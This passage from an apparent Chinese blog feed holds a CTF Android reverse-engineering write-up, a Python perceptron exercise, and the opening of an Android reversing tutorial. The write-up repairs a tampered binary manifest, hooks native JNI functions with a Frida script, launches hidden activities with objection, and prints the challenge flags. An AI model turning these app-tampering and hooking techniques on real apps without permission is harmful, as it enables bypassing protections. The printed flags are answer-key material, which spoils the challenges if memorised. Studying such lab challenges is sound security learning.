APK逆向-2</h1><p>在模拟器上安装失败，解包不能解包，用AK不能反编译。那就把它后缀改为<code>.zip</code>，解压发现可以解压。没有找到smali目录，但有<code>classes.dex</code>和<code>resources.arsc</code>文件。这两个文件在jadx都可以打开，但<code>AndroidManifest.xml</code>文件显示乱码。</p><img src="/posts/9f62af2/19.1.png" class="" title="xml文件"><p>其实我们解压时就可以知道是<code>AndroidManifest.xml</code>的问题了。</p><img src="/posts/9f62af2/19.2.png" class="" title="xml文件"><p>那么接下来就是要仔细分析<code>AndroidManifest.xml</code>文件。</p><hr><img src="/posts/9f62af2/19.3.png" class="" title="xml文件结构图"><p><code>AndroidManifest.xml</code>文件采用小端模式存储，可以大体分为四个部分：</p><ol><li>Header：头文件</li></ol><ol><li><p>String Chunk：存储字符串资源的程序块</p></li><li><p>ResourceId Chunk：存储资源id的程序块</p></li><li><p>XmlContent Chunk：存储xml内容程序块，其中包含了五个部分，Start Namespace Chunk 、End Namespace Chunk 、Start Tag Chunk 、End Tag Chunk 、Text Chunk</p></li></ol><p><strong>Header</strong></p><p>magicnumber：魔数，固定值 0x0008003(16进制)，占四个字节。</p><p>filesize：xml文件总字节数 ，占四个字节。</p><p><strong>String Chunk</strong></p><p>ChunkType：StringChunk类型，4个字节 ，固定值 0x001c0001</p><p>ChunkSize：StringChunk大小 ，4个字节</p><p>StringCount：StringChunk字符串的个数，4个字节</p><p>StyleCount：StringChunk样式的个数，4个字节，固定值 0x00000000</p><p>Unkown： 位置区域，4个字节，固定值 0x00000000解析时候需要略过4个字节</p><p>StringPoolOffset：字符串池偏移量，4个字节，偏移量相对StringChunk头部位置</p><p>StylePoolOffset：样式池偏移量，4个字节，偏移量相对于StringChunk头部位置，固定值 0x00000000 ，这个字段基本没用到过</p><p>StringOffsets：每个字符串在字符串池中的相对偏移量，int数组，它的大小是 StringCount*4 个字节</p><p>StyleOffsets：每个样式的偏移量，int数组，它的大小是 StyleCount*4 个字节</p><p>String Pool：字符串池，存储了所有的字符串</p><p>Style Pool：样式池，存储了所有的样式，一般为0</p><p><strong>ResourceId Chunk</strong></p><p>ChunkType：ResourceldChunk的类型，占4个字节，固定值 0x00080180</p><p>ChunkSize：ResourceldChunk的大小，占4个字节</p><p>ResourceIds：int数组，大小为(ChunkSize - 8) / 4 ，减 8是减去头部大小的8个字节(ChunkType和ChunkSize)</p><p><strong>XmlContent Chunk</strong></p><p>XmlContentChunk 这部分表示的是存储了清单文件的详细信息，包含的5项，其中Start Namespace Chunk 和End Namespace Chunk 这两个可以合并一个来说明， 因为它们的结构完全一致，解析过程也是一样的。至于End Tag Chunk一共有6个数据，也就是 Start Tag Chunk 的前 6 项，这里不做单独解析和说明。End Tag Chunk这个跟清单文件标签一样的，就是给解析出来的标签加上结束标签一样。Text Chunk这个模块在010 Editor模板里并没有用到过。</p><p><em>Start Namespace Chunk</em>主要包含一个清单文件的命令空间内容</p><p>ChunkType：Chunk的类型，4个字节 ，固定值 0x00100100</p><p>ChunkSize：Chunk的大小 ，4个字节</p><p>LineNumber：清单文件中的行号， 4个字节</p><p>Unknown：未知区域， 4个字节</p><p>Prefix：命名空间的前缀， 4个字节</p><p>Uri：命名空间的URI， 4个字节</p><p><em>Start Tag Chunk</em>主要存放清单文件中的标签信息</p><p>ChunkType：Chunk的类型，4个字节 ，固定值 0x00100102</p><p>ChunkSize：Chunk的大小 ，4个字节</p><p>LineNumber：清单文件中的行号， 4个字节</p><p>Unknown：未知区域， 4个字节</p><p>Namespace Uri：命名空间用到的url在字符串的索引，值为 -1 表示没有用到命名空间 uri。标签的一般都没有使用到命名空间，4个字节</p><p>Name：标签名称(在字符串中的索引值)，4个字节</p><p>Flags：标签类型例如开始标签还是结束标签，固定值0x00140014，4个字节</p><p>Attribute Count ：标签包含的属性个数，4个字节</p><p>Class Attribute ：标签包含的类属性，此项值常为 0，4个字节</p><p>Attributes ：属性内容集合,每个属性固定 20 个字节，包含 5 个字段，每个字段都是 4 字节无符号 int，解析的时候需要注意Type这个值做一次处理需要右移24位。各个字段含义如下：</p><ul><li>NamespaceUri：属性的命名空间uri 在字符串池中的索引</li></ul><ul><li>Name：属性名称在字符串池中的索引</li></ul><ul><li>ValueStr：属性值</li></ul><ul><li>Type：属性类型</li></ul><ul><li>Data：属性数据</li></ul><hr><p>首先查看xml的固定值是否有误。ChunkType应该为01 00 1c 00。而且StylePoolOffset应该为00 00 00 00。修改完后一定要点保存，而不是另存为，因为我发现另存为后有些其它值也被修改了，导致重打包后再解包时出现错误！</p><img src="/posts/9f62af2/19.4.png" class="" title="xml文件"><img src="/posts/9f62af2/19.9.png" class="" title="xml文件"><p>忽然发现解包时异常已经告诉我有其中一个错误了…</p><img src="/posts/9f62af2/19.5.png" class="" title="apk解包"><p>将它重打包时出现没有<code>apktool.yml</code>文件错误，将其它apk里面的<code>apktool.yml</code>复制一份下来，将apk文件名改了即可。</p><img src="/posts/9f62af2/19.7.png" class="" title="apktool.yml"><img src="/posts/9f62af2/19.6.png" class="" title="apktool.yml"><p>这次终于成功解包了。</p><img src="/posts/9f62af2/19.8.png" class="" title="解包成功"><p>所以xml有什么什么神秘的呢？发现中间那个字符串就是flag。</p><img src="/posts/9f62af2/19.10.png" class="" title="xml文件"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8d6efd232c63b7d2</span><br></pre></td></tr></table></figure><h1 id="20-ill-intentions"><a href="#20-ill-intentions" class="headerlink" title="20. ill-intentions"></a>20. ill-intentions</h1><img src="/posts/9f62af2/20.1.png" class="" title="运行程序"><p>翻译一下就是，选择您希望与之交互的MainActivity，待办事项：添加按钮来选择活动，现在使用的是Send_to_Activity。</p><p>载入AK看可不可以直接修改<code>AndroidManifest.xml</code>的入口，不行。程序还是那个界面。</p><img src="/posts/9f62af2/20.2.png" class="" title="修改文件"><p>那就载入jeb分析看看吧。</p><img src="/posts/9f62af2/20.3.png" class="" title="jeb分析"><img src="/posts/9f62af2/20.4.png" class="" title="jeb分析"><img src="/posts/9f62af2/20.5.png" class="" title="jeb分析"><img src="/posts/9f62af2/20.6.png" class="" title="jeb分析"><img src="/posts/9f62af2/20.7.png" class="" title="jeb分析"><p>这些方法都是在so文件里面。解包先看看so文件。导出表刚好有这三个函数。如果导出表有native函数，说明这些是导出函数；如果没有，而只有JNI_Onload，说明那些是未导出函数。</p><img src="/posts/9f62af2/20.8.png" class="" title="IDA分析"><img src="/posts/9f62af2/20.9.png" class="" title="IDA分析"><img src="/posts/9f62af2/20.10.png" class="" title="IDA分析"><img src="/posts/9f62af2/20.11.png" class="" title="IDA分析"><p>可以确定<code>DefinitelyNotThisOne</code>函数肯定没有flag。剩下那两个函数看得我头大，而且传入的参数也有些是在Java层加密过的。</p><p>因为你！我去学了Frida so hook！<a href="https://www.52pojie.cn/thread-1128884-1-1.html">Frida超详细安装实战教程</a></p><p>hook一个so方法需要知道：</p><ul><li>程序的名字(Frida-ps -U查看程序名字)：CTF Application</li><li>so文件名：libhello-jni.so</li><li>so方法名：Java_com_example_application_ThisIsTheRealOne_orThat</li></ul><p>编写hook脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">function main()&#123;</span></span><br><span class="line"><span class="string">function getjstring(jstr) &#123;</span></span><br><span class="line"><span class="string">        return Java.vm.getEnv().getStringUtfChars(jstr, null).readCString();</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">    Interceptor.attach(Module.findExportByName(&quot;libhello-jni.so&quot;,&quot;Java_com_example_application_ThisIsTheRealOne_orThat&quot;),&#123;</span></span><br><span class="line"><span class="string">        onEnter: function(args) &#123;</span></span><br><span class="line"><span class="string">            send(&quot;Hook start&quot;);</span></span><br><span class="line"><span class="string">        &#125;,</span></span><br><span class="line"><span class="string">        onLeave: function(retval)&#123;</span></span><br><span class="line"><span class="string">            send(&quot;orThat_result:&quot; + getjstring(retval));</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">setImmediate(main);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printMessage</span>(<span class="params">message,data</span>):</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(message[<span class="string">&#x27;payload&#x27;</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line">process = frida.get_remote_device().attach(<span class="string">&#x27;CTF Application&#x27;</span>)</span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>,printMessage)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><p>开启Frida服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\dell&gt;adb shell</span><br><span class="line">aosp:/ # cd /data/local/tmp</span><br><span class="line">aosp:/data/local/tmp # ls</span><br><span class="line">android_x86_server  frida-server-15.1.17-android-x86</span><br><span class="line">aosp:/data/local/tmp # ./frida-server-15.1.17-android-x86</span><br></pre></td></tr></table></figure><p>打开另一命令窗口开启端口转发，Frida默认端口27042：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\dell&gt;adb forward tcp:27042 tcp:27042</span><br><span class="line">27042</span><br></pre></td></tr></table></figure><p>等等，突然想起来我们还没去到我们想要进去的Activity，修改xml文件我是不会修改了，但可以利用objection运行指定的Activity。</p><p>安装objection：<code>pip install objection</code></p><p>在模拟器运行程序，在终端输入需要调试的程序的包名：<code>objection -g com.example.hellojni explore</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\dell&gt;objection -g com.example.hellojni explore</span><br><span class="line">Using USB device `Android Emulator 5554`</span><br><span class="line">Agent injected and responds ok!</span><br><span class="line"></span><br><span class="line">     _   _         _   _</span><br><span class="line"> ___| |_|_|___ ___| |_|_|___ ___</span><br><span class="line">| . | . | | -_|  _|  _| | . |   |</span><br><span class="line">|___|___| |___|___|_| |_|___|_|_|</span><br><span class="line">      |___|(object)inject(ion) v1.11.0</span><br><span class="line"></span><br><span class="line">     Runtime Mobile Exploration</span><br><span class="line">        by: @leonjza from @sensepost</span><br><span class="line"></span><br><span class="line">[tab] for command suggestions</span><br><span class="line">com.example.hellojni on (Meizu: 7.1.2) [usb] #</span><br></pre></td></tr></table></figure><p>列出app所有的Activity：<code>android hooking list activities</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">com.example.hellojni on (Meizu: 7.1.2) [usb] # android hooking list activities</span><br><span class="line">com.example.application.DefinitelyNotThisOne</span><br><span class="line">com.example.application.IsThisTheRealOne</span><br><span class="line">com.example.application.MainActivity</span><br><span class="line">com.example.application.ThisIsTheRealOne</span><br><span class="line"></span><br><span class="line">Found 4 classes</span><br></pre></td></tr></table></figure><p>启动指定Activity：<code>android intent launch_activity com.example.application.ThisIsTheRealOne</code> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">com.example.hellojni on (Meizu: 7.1.2) [usb] # android intent launch_activity com.example.application.ThisIsTheRealOne</span><br><span class="line">(agent) Starting activity com.example.application.ThisIsTheRealOne...</span><br><span class="line">(agent) Activity successfully asked to start.</span><br></pre></td></tr></table></figure><p>可以看到程序页面已经变了：</p><img src="/posts/9f62af2/20.12.png" class="" title="ThisIsTheRealOne页面"><p>运行脚本，点击程序中间的按钮，打印返回值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\dell\Desktop&gt;python hookso.py</span><br><span class="line">Hook start</span><br><span class="line">orThat_result:KeepTryingThisIsNotTheActivityYouAreLookingForButHereHaveSomeInternetPoints!</span><br></pre></td></tr></table></figure><p>它说这个不是我要找的Activity，换一个。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">com.example.hellojni on (Meizu: 7.1.2) [usb] # android intent launch_activity com.example.application.IsThisTheRealOne</span><br><span class="line">(agent) Starting activity com.example.application.IsThisTheRealOne...</span><br><span class="line">(agent) Activity successfully asked to start.</span><br></pre></td></tr></table></figure><p>修改脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">function main()&#123;</span></span><br><span class="line"><span class="string">function getjstring(jstr) &#123;</span></span><br><span class="line"><span class="string">        return Java.vm.getEnv().getStringUtfChars(jstr, null).readCString();</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">    Interceptor.attach(Module.findExportByName(&quot;libhello-jni.so&quot;,&quot;Java_com_example_application_IsThisTheRealOne_perhapsThis&quot;),&#123;</span></span><br><span class="line"><span class="string">        onEnter: function(args) &#123;</span></span><br><span class="line"><span class="string">            send(&quot;Hook start&quot;);</span></span><br><span class="line"><span class="string">        &#125;,</span></span><br><span class="line"><span class="string">        onLeave: function(retval)&#123;</span></span><br><span class="line"><span class="string">            send(&quot;perhapsThis_result:&quot; + getjstring(retval));</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">setImmediate(main);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printMessage</span>(<span class="params">message,data</span>):</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(message[<span class="string">&#x27;payload&#x27;</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line">process = frida.get_remote_device().attach(<span class="string">&#x27;CTF Application&#x27;</span>)</span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>,printMessage)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><p>运行，点击按钮，打印返回值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\dell\Desktop&gt;python hookso.py</span><br><span class="line">Hook start</span><br><span class="line">perhapsThis_result:Congratulation!YouFoundTheRightActivityHereYouGo-CTF&#123;IDontHaveABadjokeSorry&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF&#123;IDontHaveABadjokeSorry&#125;</span><br></pre></td></tr></table></figure><h1 id="21-LoopCrypto"><a href="#21-LoopCrypto" class="headerlink" title="21. LoopCrypto"></a>21. LoopCrypto</h1><img src="/posts/9f62af2/21.1.png" class="" title="运行程序">]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;1-app1&quot;&gt;&lt;a href=&quot;#1-app1&quot; class=&quot;headerlink&quot; title=&quot;1. app1&quot;&gt;&lt;/a&gt;1. app1&lt;/h1&gt;&lt;p&gt;这道题之前做过，也没什么难度，所以不想再说了。这道题的一个知识点就是程序自身的版本号版本名在BuildConfig中存储。&lt;/p&gt;
&lt;img src=&quot;/posts/9f62af2/1.1.png&quot; class=&quot;&quot; title=&quot;jeb分析&quot;&gt;</summary>
    
    
    
    <category term="Android逆向" scheme="http://example.com/categories/Android%E9%80%86%E5%90%91/"/>
    
    
    <category term="Reverse" scheme="http://example.com/tags/Reverse/"/>
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>感知机学习算法</title>
    <link href="http://example.com/posts/2670ba0d.html"/>
    <id>http://example.com/posts/2670ba0d.html</id>
    <published>2022-04-05T01:29:28.242Z</published>
    <updated>2022-04-11T05:25:25.212Z</updated>
    
    <content type="html"><![CDATA[<p>机器学习的第一个作业，写完纸质还有时间，那就用Python写算法试试咯，老师说后面有真正的实验报告，先用Python写一下熟悉熟悉，回顾一下前几天学的Python吧。</p><span id="more"></span><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#感知机学习算法</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ganzhiji</span>(<span class="params">lst,n,w,b</span>):</span><br><span class="line">    result = [-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">while</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">str</span>(result)).count(<span class="string">&#x27;-&#x27;</span>)!=<span class="number">0</span>):</span><br><span class="line">        result.clear()</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> lst:</span><br><span class="line">            <span class="built_in">sum</span> = x[<span class="number">2</span>] * (w[<span class="number">0</span>]*x[<span class="number">0</span>] + w[<span class="number">1</span>]*x[<span class="number">1</span>] + b)</span><br><span class="line">            result.append(<span class="built_in">sum</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">sum</span> &gt; <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;对(&#123;0&#125;,&#123;1&#125;)T&quot;</span>.<span class="built_in">format</span>(x[<span class="number">0</span>],x[<span class="number">1</span>]))</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;y(wx + b) = &#123;0&#125;(&#123;1&#125;*&#123;2&#125; + &#123;3&#125;*&#123;4&#125; + &#123;5&#125;) &gt; 0&quot;</span>.<span class="built_in">format</span>(x[<span class="number">2</span>],w[<span class="number">0</span>],x[<span class="number">0</span>],w[<span class="number">1</span>],x[<span class="number">1</span>],b), end=<span class="string">&quot;，&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;(&#123;0&#125;,&#123;1&#125;)T被正确分类&quot;</span>.<span class="built_in">format</span>(x[<span class="number">0</span>], x[<span class="number">1</span>]))</span><br><span class="line">                <span class="built_in">print</span>()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;对(&#123;0&#125;,&#123;1&#125;)T&quot;</span>.<span class="built_in">format</span>(x[<span class="number">0</span>],x[<span class="number">1</span>]))</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;y(wx + b) = &#123;0&#125;(&#123;1&#125;*&#123;2&#125; + &#123;3&#125;*&#123;4&#125; + &#123;5&#125;) &lt;= 0&quot;</span>.<span class="built_in">format</span>(x[<span class="number">2</span>],w[<span class="number">0</span>],x[<span class="number">0</span>],w[<span class="number">1</span>],x[<span class="number">1</span>],b), end=<span class="string">&quot;，&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;(&#123;0&#125;,&#123;1&#125;)T未被正确分类，更新w和b&quot;</span>.<span class="built_in">format</span>(x[<span class="number">0</span>], x[<span class="number">1</span>]))</span><br><span class="line">                w[<span class="number">0</span>] = w[<span class="number">0</span>] + n*x[<span class="number">2</span>]*(x[<span class="number">0</span>])</span><br><span class="line">                w[<span class="number">1</span>] = w[<span class="number">1</span>] + n*x[<span class="number">2</span>]*(x[<span class="number">1</span>])</span><br><span class="line">                b = b + n*x[<span class="number">2</span>]</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;w = (&#123;0&#125;,&#123;1&#125;)T, b = &#123;2&#125;&quot;</span>.<span class="built_in">format</span>(w[<span class="number">0</span>],w[<span class="number">1</span>],b))</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;得到线性模型：&#123;0&#125;x(1) + &#123;1&#125;x(2) + &#123;2&#125;&quot;</span>.<span class="built_in">format</span>(w[<span class="number">0</span>],w[<span class="number">1</span>],b))</span><br><span class="line">                <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#lst = [[4,3,1],[4,4,1],[3,1,-1]]</span></span><br><span class="line">    <span class="comment">#n = 1</span></span><br><span class="line">    w = [<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">    b = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;该算法默认权值w和偏置b都从0开始&quot;</span>)</span><br><span class="line">    lst = []</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">        z = <span class="built_in">input</span>(<span class="string">&quot;输入数据集，比如(x,y)=[3,1,-1]输入3 1 -1，输入end结束：&quot;</span>)</span><br><span class="line">        x_list = z.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;&#x27;</span>.join(x_list) == <span class="string">&quot;end&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x_list)):</span><br><span class="line">            x_list[i] = <span class="built_in">int</span>(x_list[i])</span><br><span class="line">        lst.append(x_list)</span><br><span class="line">    n = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;算法的学习率为(0&lt;n&lt;=1)：&quot;</span>))</span><br><span class="line">    ganzhiji(lst,n,w,b)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;机器学习的第一个作业，写完纸质还有时间，那就用Python写算法试试咯，老师说后面有真正的实验报告，先用Python写一下熟悉熟悉，回顾一下前几天学的Python吧。&lt;/p&gt;</summary>
    
    
    
    <category term="算法" scheme="http://example.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="Python" scheme="http://example.com/tags/Python/"/>
    
    <category term="机器学习" scheme="http://example.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向入门教程</title>
    <link href="http://example.com/posts/15be101a.html"/>
    <id>http://example.com/posts/15be101a.html</id>
    <published>2022-04-05T01:29:28.232Z</published>
    <updated>2022-04-11T05:25:15.797Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-初识APK、Dalvik字节码以及Smali"><a href="#1-初识APK、Dalvik字节码以及Smali" class="headerlink" title="1. 初识APK、Dalvik字节码以及Smali"></a>1. 初识APK、Dalvik字节码以及Smali</h1><p>后缀名为<code>.apk</code>是安卓手机app的格式。它的实质是一个ZIP压缩包，将它的后缀名修改为<code>.zip</code>便可以看到内部的文件结构。解压出来后一般有以下文件：</p><span id="more"></span><div class="table-container"><table><thead><tr><th>文件</th><th>作用</th></tr></thead><tbody><tr><td>asset文件夹</td><td>资源目录1，asset和res都是资源目录但有所区别</td></tr><tr><td>lib文件夹</td><td>so库存放位置，一般由NDK编译得到，常见于使用游戏引擎或JNI native调用的工程中</td></tr><tr><td>META-INF文件夹</td><td>存放工程一些属性文件，例如Manifest.MF</td></tr><tr><td>res文件夹</td><td>资源目录2，asset和res都是资源目录但有所区别</td></tr><tr><td>AndroidManifest.xml</td><td>Android工程的基础配置属性文件</td></tr><tr><td>classes.dex</td><td>Java代码编译得到的Dalvik VM能直接执行的文件</td></tr><tr><td>resources.arsc</td><td>对res目录下的资源的一个索引文件，保存了原工程中strings.xml等文件内容</td></tr><tr><td>其他文件夹 etc.</td></tr></tbody></table></div><h2 id="1-1-asset-VS-res"><a href="#1-1-asset-VS-res" class="headerlink" title="1.1 asset VS. res"></a>1.1 asset VS. res</h2><p>res目录下的资源文件在编译时会自动生成索引文件(R.java)，在Java代码中用R.xxx.yyy来引用；而asset目录下的资源文件不需要生成索引，在Java代码中需要用AssetManager来访问。</p><p>一般来说，除了音频和视频资源(需要放在raw或asset下)，使用Java开发的Android工程使用到的资源文件都会放在res下；使用C++游戏引擎(或使用Lua Unity3D等)的资源文件均需要放在asset下。</p><h2 id="1-2-Dalvik字节码"><a href="#1-2-Dalvik字节码" class="headerlink" title="1.2 Dalvik字节码"></a>1.2 Dalvik字节码</h2><p>Dalvik字节码是学习破解的基础。Dalvik是Google专门为Android操作系统设计的一个虚拟机，经过深度的优化。虽然Android上的程序是使用Java来开发的，但是Dalvik和标准的Java虚拟机JVM还是两回事。Dalvik VM是基于寄存器的，而JVM是基于栈的；Dalvik有专属的文件执行格式dex(dalvik executable)，而JVM则执行的是Java字节码。Dalvik VM比JVM速度更快，占用空间更少。</p><p>通过Dalvik的字节码不能直接看到原来的逻辑代码，这是需要借助如Apktool或dex2jar+jd-gui工具来帮助查看。但是，需要注意的是最终我们修改APK需要操作的文件是<code>.smali</code>文件，而不是导出来的Java文件重新编译。</p><h2 id="1-3-Smali"><a href="#1-3-Smali" class="headerlink" title="1.3 Smali"></a>1.3 Smali</h2><p>Smali是破解的重中之重。Smali，Baksmali分别是指安卓系统里的Java虚拟机(Dalvik)所使用的一种。dex格式文件的汇编器，反汇编器。其语法是一种宽松式的Jasmin/dedexer语法，而且它实现了<code>.dex</code>格式所有功能(注解，调试信息，线路信息等)。</p><p>当对APK文件进行反编译后，便会生成此类的文件。在Dalvik字节码中，寄存器都是32位的，能够支持任何类型；64位类型(Long/Double)用2个寄存器表示。Dalvik字节码有两种类型：原始类型、引用类型(包括对象和数组)。</p><div 